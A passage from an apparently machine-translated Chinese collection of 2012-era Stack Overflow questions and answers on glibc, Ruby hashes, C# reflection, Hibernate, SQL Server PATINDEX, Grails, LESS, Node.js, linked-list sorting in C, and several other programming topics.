如果能够控制前缀（它们不是真正的名称空间）会有所帮助，您可以自己制作它们以适合您。使用“key”和“other:key”或任何适合你的方案。您还可以使用 |= 运算符重新编写查询，以便您可以在单个键子句中指定两个名称空间（例如，“key”：[{“namespace|=”：[ns1,ns2]}]）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T19:49:21.627

```
for ( key in freebaseResult.result ) {
  var i, resultArray = freebaseResult.result[key];

  for ( i = 0; i < resultArray.length; i++ ) {
    alert( resultArray[i].namespace + ": " + resultArray[i].value );
  }
} 
```

# c - 如何知道编译器正在编译的函数的位置

> ID：10676597
> 
> 赞同：3
> 
> 时间：2012-05-20T19:41:15.103
> 
> 标签：c, linux, gcc, x86-64, glibc

我正在尝试修改 glibc 以与我的程序一起使用。我想向 mmap 函数添加一些代码（不是 mmap 系统调用，而是 glibc 中执行 mmap 系统调用的函数）。但是，我在源代码目录中看到了几个 mmap 或 mmap64.c 文件。

我的架构是 x86-64，所以我忽略了其他架构目录中的文件。但是，我不知道编译器使用的是哪个文件的 mmap。我故意在包含 mmap 函数的不同文件中插入了一些垃圾代码（这样编译器会出错），但是编译器可以很好地编译 glibc 而不会出现任何错误。我什至可以看到创建的 .o 文件。我不知道该做什么知道。有什么简单的方法可以确定编译器正在编译哪个 mmap？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T22:07:40.963

> 有什么简单的方法可以确定编译器正在编译哪个 mmap？

```
gdb -q libc.so.6

Reading symbols from /tmp/build/libc.so.6...done.
(gdb) list mmap
76  #else
77  
78  /* This is a "normal" system call stub: if there is an error,
79     it returns -1 and sets errno.  */
80  
81  T_PSEUDO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
82      ret
83  T_PSEUDO_END (SYSCALL_SYMBOL)
84  
85  #endif
(gdb) info source
Current source file is ../sysdeps/unix/syscall-template.S
Compilation directory is /glibc-git-rw/glibc/misc
Located in /glibc-git-rw/glibc/sysdeps/unix/syscall-template.S <<< You want this
Contains 87 lines.
Source language is asm.
Compiled with DWARF 2 debugging format.
Does not include preprocessor macro info. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T19:56:20.350

可能有一些链接器（ld）选项可能会对您有所帮助。查看`ld`手册页，--print-map 或--trace 或--trace-symbol 应该对您有所帮助。获得目标文件后，您应该能够找到相应的头文件。

# php - 如何从 PHP 中的信息哈希中获取要下载的 torrent 文件？

> ID：10676606
> 
> 赞同：1
> 
> 时间：2012-05-20T19:43:06.073
> 
> 标签：php

我有很多关于 torrent 的信息哈希，但无法将它们与任何此类 torrent 文件相关联，我正在尝试编写一个 PHP 程序来为我执行此操作并下载 torrent 文件。

在浏览器中，最后 40 位数字是信息哈希，

```
href="magnet:?xt=urn:btih:7ea1b59cce1737437a66e29a2843b5ce3a0c8cd9" 
```

我试图像这样在php中下载文件，

```
$file = 'magnet:?xt=urn:btih:7ea1b59cce1737437a66e29a2843b5ce3a0c8cd9';
fopen($file, 'r'); 
```

但它不起作用？？我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:10:58.107

您可能想看看[http://pear.php.net/package/File_Bittorrent2](http://pear.php.net/package/File_Bittorrent2)

# ruby - Ruby：从哈希哈希中删除特定键的所有实例

> ID：10676608
> 
> 赞同：9
> 
> 时间：2012-05-20T19:43:08.273
> 
> 标签：ruby

我有一个像

```
h = {1 => {"inner" => 45}, 2 => {"inner" => 46}, "inner" => 47}

```

如何删除包含“inner”键的每一对？
您可以看到一些“内部”对直接出现在其中，`h`而另一些则成对出现在`h`

请注意，我只想删除“内部”对，所以如果我在上面的哈希上调用我的批量删除方法，我应该得到

```
h = {1 => {}, 2 => {}}
```

由于这些对没有键 == "inner"

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-20T23:40:26.147

真的，这就是拒绝！是为了：

```
def f! x
  x.reject!{|k,v| 'inner' == k} if x.is_a? Hash
  x.each{|k,v| f! x[k]}
end 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-05-20T20:16:11.867

```
def f x 
  x.inject({}) do |m, (k, v)|
    v = f v if v.is_a? Hash  # note, arbitrarily recursive
    m[k] = v unless k == 'inner'
    m
  end
end

p f h 
```

*更新：* 略有改进...

```
def f x
  x.is_a?(Hash) ? x.inject({}) do |m, (k, v)|
    m[k] = f v unless k == 'inner'
    m
  end : x
end 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2016-03-03T23:34:23.500

```
def except_nested(x,key)
  case x
  when Hash then x = x.inject({}) {|m, (k, v)| m[k] = except_nested(v,key) unless k == key ; m }
  when Array then x.map! {|e| except_nested(e,key)}
  end
  x
end 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-02-15T17:21:16.500

这是我想出的：

```
class Hash
  def deep_reject_key!(key)
    keys.each {|k| delete(k) if k == key || self[k] == self[key] }

    values.each {|v| v.deep_reject_key!(key) if v.is_a? Hash }
    self
  end
end 
```

适用于 Hash 或 HashWithIndifferentAccess

```
> x = {'1' => 'cat', '2' => { '1' => 'dog', '2' => 'elephant' }}
=> {"1"=>"cat", "2"=>{"1"=>"dog", "2"=>"elephant"}}

> y = x.with_indifferent_access
=> {"1"=>"cat", "2"=>{"1"=>"dog", "2"=>"elephant"}}

> x.deep_reject_key!(:"1")
=> {"1"=>"cat", "2"=>{"1"=>"dog", "2"=>"elephant"}}

> x.deep_reject_key!("1")
=> {"2"=>{"2"=>"elephant"}}

> y.deep_reject_key!(:"1")
=> {"2"=>{"2"=>"elephant"}} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-09-03T22:22:29.493

类似的答案，但它是一种白名单类型的方法。对于红宝石 1.9+

```
# recursive remove keys
def deep_simplify_record(hash, keep)
  hash.keep_if do |key, value|
    if keep.include?(key) 
      deep_simplify_record(value, keep) if value.is_a?(Hash)
      true
    end
  end
end

hash = {:a => 1, :b => 2, :c => {:a => 1, :b => 2, :c => {:a => 1, :b => 2, :c => 4}} }
deep_simplify_record(hash, [:b, :c])
# => {:b=>2, :c=>{:b=>2, :c=>{:b=>2, :c=>4}}} 
```

这里还有一些我喜欢用于哈希的其他方法。 [https://gist.github.com/earlonrails/2048705](https://gist.github.com/earlonrails/2048705)

# c# - 是否可以通过反射调用“选择”方法

> ID：10676612
> 
> 赞同：3
> 
> 时间：2012-05-20T19:44:05.770
> 
> 标签：c#, linq, reflection

我正在做一个项目，我遇到的情况是我需要从可查询的对象中“选择”数据。不幸的是，在编译时我不知道实际的可查询对象是什么类型。所以我试图通过反射调用“选择”方法。到目前为止我尝试过的代码如下。

```
....
.......
//suppose that I've got TSource and TResult at runtime.
Type argumentType = Model.GetArgumentType();

//get a queryable object from modle.
IEnumerable obj   = Model.GetQueryableObject(); 

//looking for Select<TSource, TResult>(this IEnumerable<TSource> source, Func<TSource, TResult> selector);
var selectMethod = typeof(System.Linq.Enumerable)
                  .GetMethods(BindingFlags.Static | BindingFlags.Public)
                  .Where(mi => mi.Name == "Select" &&                            
                               mi.GetParameters()[1].ParameterType.GetGenericArguments().Count() == 2)
                  .Single()
                  .MakeGenericMethod(new Type[] { argumentType, argumentType });

//that is where I have no idea how to do it
var result = selectMethod.Invoke(null, new object[] { obj, **xxxxxx** });
....
... 
```

谁能告诉我如何`Func<TSource, TResult>`为 selectMethod 制作一个“”以通过反射调用“Select”方法？谢谢。

**更新：** 正如@Jon Skeet 提到的。示例代码中有几个错误。显然，我可能会以错误的方式问这个问题（绝对是我的错）。所以我决定修改原始问题以使其更清楚（或更糟）。希望有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T15:15:28.897

（这个答案曾经只是一个评论。）

会是这样的

```
Type funcType = typeof(Func<,>).MakeGenericType(argumentType, argumentType); 
```

（在实际情况下，您可能不希望`TSource`和`TResult`相同。）

之后，[`Delegate.CreateDelegate`](http://msdn.microsoft.com/en-us/library/53cz7sc6)使用您`funcType`想要放入新委托的任何“选择功能”进行调用。

# java - Hibernate 的对象关系映射 - “会话绑定”是什么意思？

> ID：10676613
> 
> 赞同：3
> 
> 时间：2012-05-20T19:44:34.527
> 
> 标签：java, hibernate

我目前正在尝试使用 Hibernate 迈出第一步，但不幸的是，我并没有真正理解“会话绑定”的含义。

假设我有一个瞬态对象。一旦它被持久化，它不仅有一个 ID，而且是“会话绑定的”。但为什么值得一提？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T20:00:55.670

Hibernate 中的 Session 与事务密切相关，也作为一级缓存。每次读取或存储对象时，它都会自动绑定到当前会话（因此放置在 L1 缓存中）。

最重要的是，只要一个对象绑定到会话：

*   你可以利用延迟加载关系（否则你会得到可怕的`LazyInitializationException`）。

*   从那一刻起对该对象的所有更改都将自动填充到基础数据库中。只要对象绑定到会话，就不需要手动持久化。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T01:26:31.713

还要记住，当使用像 spring 中那样的事务管理层时，当你的最外层事务被提交时，你的会话通常会消失：

```
public class MyRep implements Rep {
   @Transactional
   public MyObject findMyObject(..) { ... }
} 
```

因此，当您在 spring 中激活事务管理时，假设您尚未参与事务，如果您这样做：

```
MyObject o = rep.findMyObject(...); 
```

到此方法完成时，您的对象不再绑定到会话（因为 spring 已关闭您的会话）。有办法克服这个问题，但我不会在这里讨论，只是想让你知道。

# jquery - 我使用 Jquery addClass() 更改背景，但在 IE6 中不起作用

> ID：10676614
> 
> 赞同：1
> 
> 时间：2012-05-20T19:44:40.767
> 
> 标签：jquery, hover, internet-explorer-6

我使用 Jquery addClass() 方法在鼠标悬停时更改 DIV 的背景，但是为什么它在 IE6 中不起作用，但是字体颜色发生了变化。网址：[http ://www.wfuns.com/soiseek](http://www.wfuns.com/soiseek)

CSS：

```
#container #index_sidebar .mycats .item{
   width:200px;
   height:auto;
   overflow:hidden;
   padding:8px 10px 12px 10px;
   *padding:8 0 12px;/*IE7*/
   position:relative;
   z-index:200;
   background:#59a818 url(../img/icons/menu_icon.png) no-repeat 179px -27px;
   border-bottom:1px solid #78c03d;
}
/*Hover*/
#container #index_sidebar .mycats .hover_bg{
   background:#fff;
}
#container #index_sidebar .mycats .hover_bg a{
   color:#59a818;
} 
```

**查询：**

```
 $('#index_sidebar .mycats .item').bind({
       mouseover: function() {
        $(this).addClass("hover_bg");
      },
      mouseout: function() {
        $(this).removeClass("hover_bg"); 
      }
    }); 
```

HTML：

```
<div id="index_sidebar">
      <div class="mycats">
        <div class="item"><a href="#" class="parent">Category</a>
          <p class="sub_cats"><a href="#">NXP</a> <a href="#">ABB</a> <a href="#">CTS</a></p>
        </div>
        <div class="sub_menu">
          <p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
        </div>
      </div>
</div> 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:56:54.733

你真的根本不需要任何 jQuery 或 Javascript 代码。

您只需要了解 CSS`:hover`功能，它完全可以执行您在此处尝试执行的操作，而无需所有代码。

您可能添加了代码来解决在 IE6 中无法正常工作的事实`:hover`，但您不需要此代码；只需使用其中一种 IE6-hover hack，例如[What:hover](http://peterned.home.xs4all.nl/csshover.html)。

所以你只需要这个 CSS：

```
#container #index_sidebar .mycats .item:hover {
    background:#fff;
}
#container #index_sidebar .mycats .item:hover a {
    color:#59a818;
} 
```

...加上`behavior`What:Hover 网站上描述的样式，它可以在所有浏览器中完美运行，无需任何 Javascript 代码。

（好吧，是的，Whatever:hover 是用 Javascript 编写的，所以从技术上讲，有一些 JS 代码，但仅在 IE6 中，它与您的其余代码无关，而且任何其他浏览器都看不到它）

# sql-server - SQL Server 2008 R2 - 标量 UDF 导致无限循环

> ID：10676615
> 
> 赞同：1
> 
> 时间：2012-05-20T19:44:45.650
> 
> 标签：sql-server, sql-server-2008, tsql, pattern-matching, user-defined-functions

以下代码导致无限循环或执行速度非常慢：

```
CREATE FUNCTION [dbo].[CleanUriPart] 
(
    -- Add the parameters for the function here
    @DirtyUriPart nvarchar(200)
)

RETURNS nvarchar(200)
AS
BEGIN;
    -- Declare the return variable here
    DECLARE @Result nvarchar(200);

DECLARE @i int;

SET @i = 1;

WHILE 1 = 1
BEGIN;
    SET @i = PATINDEX('%[^a-zA-Z0-9.~_-]%', @DirtyUriPart COLLATE Latin1_General_BIN);
    IF @i > 0
        SET @DirtyUriPart = STUFF(@DirtyUriPart, @i, 1, '-');
    ELSE
        BREAK;
END;

-- Add the T-SQL statements to compute the return value here
SELECT @Result = @DirtyUriPart;

-- Return the result of the function
RETURN @Result;

END; 
```

输入/输出应如下所示：

*   'abcdef' -> 'abcdef' 工作正常
*   'abc-def' -> 'abc-def' 导致无限循环
*   'abc*def' -> 'abc-def' 导致无限循环
*   等等

请帮忙！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:39:42.903

```
SELECT PATINDEX('%[^a-]%', N'aaa-def' COLLATE Latin1_General_BIN),
       PATINDEX('%[^-a]%', N'aaa-def' COLLATE Latin1_General_BIN), 
       PATINDEX('%[^a-]%', 'aaa-def' COLLATE Latin1_General_BIN),
       PATINDEX('%[^-a]%', 'aaa-def' COLLATE Latin1_General_BIN) 
```

退货

```
----------- ----------- ----------- -----------
1           5           5           5 
```

所以似乎对于`varchar`数据类型，尾随`-`被视为集合的一部分，而对于`nvarchar`它被忽略（被视为格式错误的范围也`a`被忽略？）

[LIKE](http://msdn.microsoft.com/en-us/library/ms179859.aspx)的 BOL 条目没有明确讨论如何使用`-`within`[]`将其视为集合的一部分，但确实有示例

```
LIKE '[-acdf]' 
```

匹配`-, a, c, d, or f`所以我假设它需要是一组中的第一项（即`[^a-zA-Z0-9.~_-]`需要更改为`[^-a-zA-Z0-9.~_]`）。这也符合我上面的测试结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T20:13:18.093

@DirtyUriPart 是否有可能评估为 NULL？在 PATINDEX 函数上，如果模式或表达式为 NULL，则 PATINDEX 返回 NULL，在这种情况下，NULL 将导致无限循环

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T21:16:21.980

看起来您可以通过转换`@DirtyUriPart`为`VARCHAR(200)`in来解决问题`PATINDEX`，这将导致破折号与类中的其他字符一起被识别：

```
DECLARE @DirtyUriPart nvarchar(200)='abc-def';

-- Returns 0
SELECT PATINDEX('%[^a-zA-Z0-9.~_-]%', CAST(@DirtyUriPart AS VARCHAR(200)) COLLATE Latin1_General_BIN);

-- Returns 4
SELECT PATINDEX('%[^a-zA-Z0-9.~_-]%', @DirtyUriPart COLLATE Latin1_General_BIN); 
```

# android - 有没有办法在 Android 中启动完全自动化的应用程序安装？

> ID：10676618
> 
> 赞同：0
> 
> 时间：2012-05-20T19:45:07.260
> 
> 标签：android, installation, in-app

是否可以启动完全自动化的应用程序安装（在用户单击“安装应用程序”按钮后）？还是我只需在浏览器中打开相应的 Google Play 页面，用户必须像往常一样从 Google Play 处理安装？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T19:48:55.143

不可以。在没有用户干预的情况下从 API 安装应用程序是不可能的。这有很多原因，您可以执行权限提升，仅举一个。相反，您只需将用户重定向到 Google Play 应用程序。

# android - 如何在 Android 中创建这样的 3d 动画？

> ID：10676620
> 
> 赞同：4
> 
> 时间：2012-05-20T19:45:21.737
> 
> 标签：android, animation, 3d, android-custom-view

我需要在 Android 中创建一个自定义视图来执行此动画： [http ://www.youtube.com/watch?feature=player_detailpage&v=owDzB4Q95fM#t=48s](http://www.youtube.com/watch?feature=player_detailpage&v=owDzB4Q95fM#t=48s)

谁能指出我应该使用哪些视图和类？任何类似或接近想法的教程？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:51:34.473

我建议你看看这些链接

[融合器 Coverflow v1](http://www.inter-fuser.com/2010/01/android-coverflow-widget.html)

[融合器coverflow v2](http://www.inter-fuser.com/2010/02/android-coverflow-widget-v2.html)

[开源覆盖流项目](http://code.google.com/p/android-coverflow/)

希望这是你正在寻找的

# grails - 通过 grails 域类中的构造函数设置 groovy getter/setter 方法

> ID：10676627
> 
> 赞同：3
> 
> 时间：2012-05-20T19:46:20.760
> 
> 标签：grails, groovy, constructor, javabeans

我有一个 grails 单元测试，其代码类似于下面，并且似乎通过 getter/setter 方法设置字段不适用于构造函数（即使它实际上适用于非域类）。

我了解以下内容适用于属性：

```
class Person {
  def firstName
  def lastName

  def getFullName() {
    return "$firstName $lastName"
  }

  def setFullName(name) {
    firstName = name.split(" ")[0]
    lastName = name.split(" ")[1]
  }
}

def = new Person(fisrtName: "Joe", lastName: "Bloggs") 
```

但是当我执行以下操作时，没有设置名字和姓氏字段：

```
def = new Person(fullName: "Joe Bloggs") 
```

有没有办法通过 groovy 构造函数中的方法设置字段？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T23:23:59.770

你用的是什么版本的 groovy？这对我来说很好用 groovy 1.8.6，我认为它在很长一段时间内都适用于这种方式：

```
class Person {
  def firstName
  def lastName

  def getFullName() {
    return "$firstName $lastName"
  }

  def setFullName(name) {
    firstName = name.split(" ")[0]
    lastName = name.split(" ")[1]
  }
}

def p1 = new Person(firstName: "Joe", lastName: "Bloggs")
def p2 = new Person(fullName: "Joe Bloggs")

assert p1.firstName == p2.firstName
assert p1.lastName == p2.lastName 
```

更新：

刚刚在 grails 2.0.3 上尝试过。您需要在方法签名中更加明确，才能使 grails 正常工作。我将 getter 的方法签名`String`和 setter的方法签名更改为`void`有效。它不适用于`def`. Grails 2 在匹配签名方面比以前版本的 grails 更加严格，我敢打赌这是其中的一部分。

此外，您应该指定`fullName`“属性”是瞬态的，因为它不是应该保留在数据库中的真实属性。这是在 grails 2.0.3 中为我工作的域和测试类：

Person.groovy：

```
package com.example

class Person {
    String firstName
    String lastName

    static transients = ["fullName"]

    String getFullName() {
        return "$firstName $lastName"
    }

    void setFullName(String name) {
        firstName = name.split(" ")[0]
        lastName = name.split(" ")[1]
    }
} 
```

PersonTests.groovy：

```
package com.example

import grails.test.mixin.*
import org.junit.*

/**
 * See the API for {@link grails.test.mixin.domain.DomainClassUnitTestMixin} for usage instructions
 */
@TestFor(Person)
@Mock([Person])
class PersonTests {

    void testFullName() {
        Person p1 = new Person(firstName: "Joe", lastName: "Bloggs").save(failOnError: true)
        Person p2 = new Person(fullName: "Joe Bloggs").save(failOnError: true)

        assert p1.firstName == p2.firstName
        assert p1.lastName == p2.lastName
        assert p1.fullName == p2.fullName
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T12:52:13.777

这是[因为](http://jira.grails.org/browse/GRAILS-8972)[在此处](http://grails.org/doc/2.0.2/ref/Constraints/bindable.html) 查看“可绑定”

# css - LESS CSS，来自变量的@import 路径

> ID：10676628
> 
> 赞同：15
> 
> 时间：2012-05-20T19:47:17.077
> 
> 标签：css, less

我想用库的路径声明一个变量：

```
@libPath: "any/path/to/lib"; 
```

并在`@import`. 像这样的东西：

```
@import "@{libPath}/file.less"; 
```

我看到处理后的结果：

```
@import url("@{libPath}/file.less"); 
```

没有这种可能性还是我做错了什么？

*谢谢。*

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-17T17:15:53.827

FWIW[**这是**less.js](https://github.com/cloudhead/less.js/issues/410)中的一个错误，已经讨论了一年多。至少有两次尝试解决此问题，但其中一次需要对公共 API 进行大量更改，因此被拒绝。[另一种方法只能部分起作用](https://github.com/cloudhead/less.js/pull/1108)。

另一方面，[lessphp 现在支持这个没有问题](http://leafo.net/lessphp/)；我不知道 dotless 是否可以。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T08:22:29.293

less.js 或 dotless 不支持它，所以我认为 less PHP 是一样的。添加可能不难，为什么不添加功能请求。

另外，您要解决的问题是什么？也许可以用更好的方法解决。

# node.js - node.js 并发运行，或者是吗？

> ID：10676629
> 
> 赞同：0
> 
> 时间：2012-05-20T19:47:27.720
> 
> 标签：node.js

男生和女生，

我今天一直在搞乱 node.js，我似乎无法重现这种并发的魔力。

我写了这个相当小的服务器：

```
var http = require("http");

var server = http.createServer(function(req, res) {

    setTimeout(function() {     

        res.writeHead(200,{"content-type":"text/plain"});
        res.end("Hello world!");

    }, 10000);    

});

server.listen(8000); 
```

但奇怪的是，同时在多个 chrome 标签中运行 localhost:8000 时。好像请求是“排队”的。第一个选项卡需要 10 秒，第二个选项卡需要 20 秒，第三个选项卡需要 30 秒等等......

但是，当使用[Links](http://en.wikipedia.org/wiki/Links_%28web_browser%29)运行这个非常示例时，它的行为符合我的预期（同时处理请求）。

PS 这似乎发生在 Chrome 和 Firefox

离奇的

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-20T20:08:34.750

对相同 URL/主机名的请求在浏览器中的客户端排队。这与node.js无关，您的代码很好。

如果您在每个选项卡中使用不同的 URL，那么您的示例应该可以工作。（几个标签）

还可以看看：[Multiple Ajax requests for same URL](https://stackoverflow.com/q/9189591/511300)

# c - Bubble Sorting a linked list, by names

> ID：10676630
> 
> 赞同：0
> 
> 时间：2012-05-20T19:47:53.327
> 
> 标签：c

I have a linked list, and I want to sort them by names (for example the names "Bx", "Tx", "Ax" would become : "Ax", "Bx", "Tx")... I need to switch the names if the one in the node's right has a "smaller name"..

this is what I wrote:

```
typedef struct data
{
char *name;
}data;

typedef struct Node 
{
data NodeData;
struct Node *next;
struct Node *prev;
}Node;

void Sorting(Node *head)
{
 Node *temp = head;
 Node *temp2 = (Node*)malloc(sizeof(Node));
 while (temp != NULL)
 {
       if (1 == (strcmp(temp -> NodeData.name, temp -> next -> NodeData.name))) 
       {
              strcpy (temp2 -> NodeData.name, temp -> NodeData.name);
              strcpy (temp -> NodeData.name, temp -> next -> NodeData.name);
              strcpy (temp -> next -> NodeData.name, temp2 -> NodeData.name);
       } 

       temp = temp -> next;

 }

} 
```

I'm getting an runtime - error on the part where I need to swarp betwen the node's name(the strcpy lines): An access violation (segmentation fault)...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:05:29.370

I don't think you should be sorting the list by exchanging the data values, instead you should swap the nodes themselves. Note that this requires you to return the pointer to the new first node of the list.

EDIT: Passing a pointer to the head of the list also works, if you're into doubly-indirect pointers. It can make the code simpler too.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T19:51:52.193

`temp2` is `char*` here

```
char *temp2; 
```

but `Node` here

```
strcpy (temp2 -> NodeData.name, temp -> NodeData.name); 
```

So yes, on this line, you behave as if `temp2` was a structure or union, but it is not.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T21:01:55.163

```
if (1 == (strcmp(temp -> NodeData.name, temp -> next -> NodeData.name))) {...} 
```

When this line is executed, there is no guarantee that temp->next is not NULL. If it is NULL, temp->next->NodeData.Name would be rather painfull.

Also, as has been said, testing strcmp()s result against 1 is not right. strcmp can resutning any value equal to zero, < zero or > zero.

Also, as has been said, strcpy() is not right; the strings could have different allocated sizes, or could live in non-writable memory (string constants) . Swapping the pointers will suffice.

UPDATE:

```
void Sorting(Node *head)
{
 Node *temp ;

                /* since the compare dereferences temp->next you'll have to verify that it is not NULL */
 for (temp = head; temp && temp->next; temp = temp->next)  
 {
       if (strcmp(temp->NodeData.name, temp->next->NodeData.name) > 0 )  
       {
                /* no need for a whole node, since you only copy a pointer */
              char *cp;
              cp = temp->NodeData.name;
              temp->NodeData.name = temp->next->NodeData.name;
              temp->next->NodeData.name = cp;
       } 

 }

} 
```

BTW: bubble sorting a linked list is really ugly. Linked lists are easyer and more elagantly sorted by mergesort.

# css - Twitter引导导航栏对小屏幕没有响应

> ID：10676631
> 
> 赞同：0
> 
> 时间：2012-05-20T19:47:58.780
> 
> 标签：css, twitter-bootstrap, pug

我正在测试 twitter bootstrap 2 以查看其中的响应功能。但我不能让它在小型设备上工作。这是我的导航栏玉模板代码：

```
div.navbar.navbar-fixed-top
  div.navbar-inner
    div.container-fluid
      a.brand(href="#") WOWITO
      div.nav-collapse
       ul.nav
        li.active
         a(href='/getpassword', data-transition='fade', data-role='button', data-theme='a') Forgot Password?
      div.btn-group.pull-right
        a.btn.dropdown-toggle(href="#",data-toggle="dropdown") 
         i.icon-user 
         Font Size
         span.caret
        ul.dropdown-menu
         li
          a#fs_med medium 
         li
          a#fs_lrg large
         li
          a#fs_xlrg xlarge 
```

这是我的布局代码：

```
 meta(name='viewport', content="width=device-width, initial-scale=1.0")
    link(rel='stylesheet', href='/bootstrap/css/bootstrap.min.css')
    style( type="text/css")
      body {
      padding-top: 60px;
      padding-bottom: 40px;
      }
      .sidebar-nav {
       padding: 9px 0;
       }
    link(rel='stylesheet', href='/stylesheets/bootstrap-responsive.min.css')
    link(rel='stylesheet', href='/stylesheets/style.css')
    script(type='text/javascript', src='/javascripts/jquery.min.js') 
    script(type='text/javascript', src='/bootstrap/js/bootstrap.min.js') 
```

有什么遗漏吗？我该如何解决？

谢谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-19T01:07:31.313

这应该有效。似乎响应式样式表没有加载。路径可能不正确。如果所有引导样式表都在同一个文件夹中（正如我想象的那样），那么该行可能应该是：

```
link(rel='stylesheet', href='/bootstrap/css/bootstrap-responsive.min.css') 
```

代替：

```
link(rel='stylesheet', href='/stylesheets/bootstrap-responsive.min.css') 
```

# sinatra - Redcarpet 的 Sinatra 渲染和传递渲染选项

> ID：10676634
> 
> 赞同：1
> 
> 时间：2012-05-20T19:48:12.890
> 
> 标签：sinatra, markdown, tilt, redcarpet

我正在使用 Sinatra，而 Sinatra 使用 Tilt 进行模板渲染。

默认情况下，Redcarpet 有许多渲染扩展。如何通过 Sinatra 的`#render`方法使用其中一些扩展？

我需要渲染带有`:gh_codeblock`扩展名的降价文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T21:50:20.803

在 Sinatra 中，您通常不`render`直接使用方法，而是使用与[相应模板语言对应](http://www.sinatrarb.com/intro.html#Views%20/%20Templates)的方法，在这种情况下[`markdown`](http://www.sinatrarb.com/intro.html#Markdown%20Templates)。

您*应该*能够将您想要的任何选项作为哈希传递给此方法，Sinatra（和 Tilt）会将它们传递给模板引擎。但是，最新发布的 Tilt gem (1.3.3) 并没有通过所有的降价选项，只有`:filter_html`and `:smart`，所以这不起作用。这已在当前的 Tilt 头部中修复，只是尚未发布到已发布的 gem 中。

如果您使用的是[Bundler ，则可以通过使用](http://gembundler.com/)[Bundler 的 Git 支持](http://gembundler.com/git.html)来解决此问题：

```
gem 'tilt', :git => 'git://github.com/rtomayko/tilt.git' 
```

或者，您可以[下载](https://github.com/rtomayko/tilt/downloads)最新版本的 Tilt 并确保其`lib`目录位于您的应用程序加载路径上，也许将其放入`vendor`目录中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:03:43.500

如果我阅读了 sinatra、tilt 和 redcarpet 的源代码，你应该可以这样做：

```
render('your_view', {:gh_codeblock => true}, {HASH_OF_YOUR_LOCAL_VARIABLES}) 
```

要呈现的第二个参数是传递给模板引擎的选项哈希。看：

```
def markdown(template, options={}, locals={})
  render :markdown, template, options, locals
end 
```

# javascript - Google Maps api v3 (Javascript)：信息窗口中的图像

> ID：10676638
> 
> 赞同：1
> 
> 时间：2012-05-20T19:48:52.797
> 
> 标签：javascript, google-maps-api-3, google-maps-markers, infowindow

我正在尝试建立一个网站，并且我想要一个地图，其中包含多个标记（具有不同颜色）并使用复选框进行过滤。我正在研究这个例子：

[http://www.geocodezip.com/v3_MW_example_categories.html](http://www.geocodezip.com/v3_MW_example_categories.html)

我已经对其进行了一些更改，并删除了侧边栏。它对我很有用，但是我将如何在信息窗口中放置图像有点令人困惑。我想在信息窗口中有一个缩略图大小的图像和一个小评论。这个例子有一个外部 xml 文件[http://www.geocodezip.com/categories.xml](http://www.geocodezip.com/categories.xml)带有一个标签和几个属性，如名称、id、地址、类别。它还使用外部 js 文件，但这并不困扰我。

我正在考虑创建一个名为 content 的数组并将图像放在那里，然后在 for 中调用它（第 195 行）。类似于创建一个名为 content () 的新变量；并将其添加到 var html(); （第 202 行）。但这行不通。例如，我还想过在名称“照片”上放置一个属性。但是地图甚至没有显示在页面上。

显然我不是程序员，我的技能也不是很好。如果有人对此有任何线索，我将不胜感激！也对不起我的英语。谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:13:41.013

我可以为你写页面，但那有什么乐趣呢？;)

首先，可以从这里获得标记：

[https://sites.google.com/site/gmapsdevelopment/](https://sites.google.com/site/gmapsdevelopment/) Ctrl-查找“ms/micons”。

还有[谷歌图表图标](http://code.google.com/apis/chart/infographics/docs/dynamic_icons.html)，但现在已弃用。

我建议看看[这个页面](http://www.wolfpil.de/v3/toggle-cats.html)。它具有分组的复选框，您可以删除不需要的内容，就像您提到的那样，侧边栏。诀窍是它使用 Ajax 从[这个 xml](http://www.wolfpil.de/markers-muenchen.xml)中检索标记信息。您可以采用相同的方法，或者直接在 JavaScript 文件中创建数据数组。

关于 InfoWindow 中的图像，只需在 myInfoWindow.setContent(html) 的 html 中放置一个“img src”标签即可。如果你能指出哪里出了问题，我会看看。当地图不显示时，通常会有一个 JavaScript 错误，您的浏览器控制台会告诉您。（Firefox 中的 Firebug，Chrome 中的 Ctrl+Shift+I 或 F12）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-16T05:37:02.343

可以在[此处](http://powerhut.co.uk/googlemaps/custom_markers.php)使用图像创建自定义标记。

# c++ - C++循环继承和类

> ID：10676640
> 
> 赞同：0
> 
> 时间：2012-05-20T19:49:13.550
> 
> 标签：c++

